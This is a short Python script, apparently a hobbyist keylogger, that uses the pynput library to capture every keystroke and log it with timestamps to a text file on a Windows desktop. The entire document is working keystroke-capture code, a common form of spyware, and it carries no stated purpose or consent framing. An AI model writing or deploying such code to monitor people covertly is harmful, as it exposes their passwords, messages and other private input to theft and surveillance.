from pynput.keyboard import Key, Listener
import logging

log_dir = "C:/Users/ASUS/Desktop/loger.txt"

logging.basicConfig(filename=log_dir, level = logging.DEBUG, format = '%(asctime)s: %(message)s')

def on_press(Key):
    logging.info(str(Key))

with Listener(on_press = on_press)as listener:
    listener.join()